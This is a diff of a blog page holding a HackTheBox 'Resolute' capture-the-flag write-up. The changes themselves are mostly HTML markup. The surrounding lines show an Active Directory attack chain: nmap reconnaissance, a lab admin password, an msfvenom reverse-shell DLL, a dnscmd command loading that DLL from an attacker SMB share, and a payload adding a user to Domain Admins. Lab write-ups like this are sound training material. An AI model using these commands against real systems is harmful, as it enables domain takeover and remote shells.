@@ -8,7 +8,7 @@
   <link rel="stylesheet" type="text/css" href="/css/style.css">
   <link rel="preconnect" href="https://fonts.gstatic.com"> 
   <link
-  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Roboto+Mono&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
   rel="stylesheet"> 
   <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
@@ -22,6 +22,7 @@
 
 </head>
 
+<body>
 <!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
 <pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
  ___               _   ___   ___ 
@@ -68,7 +69,7 @@
 <h1 id="hackthebox---resolute-writeup">Hackthebox - Resolute Writeup</h1>
 <p><img src="/img/htb_resolute/card.png" /></p>
 <h1 id="nmap-scan">Nmap Scan</h1>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">ip=</span>10.10.10.169</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">ip</span><span class="op">=</span>10.10.10.169</span></code></pre></div>
 <div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.put <span class="va">$ip</span></span></code></pre></div>
 <p>open ports: * 53/tcp open domain? * 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z) * 135/tcp open msrpc Microsoft Windows RPC * 139/tcp open netbios-ssn Microsoft Windows netbios-ssn * 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) * 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) * 464/tcp open kpasswd5? * 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 * 636/tcp open tcpwrapped * 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local)</p>
 <p><img src="/img/htb_resolute/1.png" /></p>
@@ -199,16 +200,16 @@ Password: Serv3r4Admin4cc123!</p>
 <h1 id="privilege-escalation---administrator">Privilege escalation - Administrator</h1>
 <h2 id="dll-injection-in-dns-service">DLL injection in DNS service</h2>
 <p>Issuing the command whoami, we find that our user ryan is a memeber of the group <strong>dnsadmins</strong></p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>whoami /all</span></code></pre></div>
+<div class="sourceCode" id="cb18"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>whoami <span class="op">/</span>all</span></code></pre></div>
 <p><img src="/img/htb_resolute/7.png" /></p>
 <p>Members of the group dnsadmins can be used for privilege escalation to admin with dll injection. This trick is described <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a>.</p>
 <p>We can generate our payload dll with msfvenom.</p>
 <pre class="shell"><code>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 -f dll -o dns.dll
 smbserver.py SHARE ./</code></pre>
 <p>On target, we can change the config of the dns since the user ryan belongs to the group <strong>dnsadmins</strong>. We can also start and stop the dns service.</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>dnscmd RESOLUTE /config /serverlevelplugindll \\10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">55</span>\SHARE\dnsprivesc.<span class="fu">dll</span></span>
-<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span>.<span class="fu">exe</span> stop dns</span>
-<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span>.<span class="fu">exe</span> <span class="fu">start</span> dns</span></code></pre></div>
+<div class="sourceCode" id="cb20"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>dnscmd RESOLUTE <span class="op">/</span>config <span class="op">/</span>serverlevelplugindll \\10<span class="op">.</span><span class="fu">10</span><span class="op">.</span><span class="fu">14</span><span class="op">.</span><span class="fu">55</span>\SHARE\dnsprivesc<span class="op">.</span><span class="fu">dll</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span><span class="op">.</span><span class="fu">exe</span> stop dns</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span><span class="op">.</span><span class="fu">exe</span> <span class="fu">start</span> dns</span></code></pre></div>
 <p><img src="/img/htb_resolute/8.png" /></p>
 <p>We open up a nc listener at port 8888</p>
 <div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 8888</span></code></pre></div>
@@ -216,7 +217,7 @@ smbserver.py SHARE ./</code></pre>
 <div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> windows/x64/exec cmd=<span class="st">&#39;net group &quot;domain admins&quot; melanie /add /domain&#39;</span> <span class="at">--platform</span> windows <span class="at">-f</span> dll <span class="op">&gt;</span> dns.dll</span>
 <span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">smbserver.py</span> SHARE ./</span></code></pre></div>
 <p>Next we login to user melanie using evilwinrm and look at our user info using</p>
-<div class="sourceCode" id="cb23"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>whoami /all</span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>whoami <span class="op">/</span>all</span></code></pre></div>
 <p><img src="/img/htb_resolute/9.png" /></p>
 <p>We see that we are now a member of the administrator group and can execute administrator commands. So we can get our required root.txt at C:.txt</p>
 <p><img src="/img/htb_resolute/10.png" /></p>
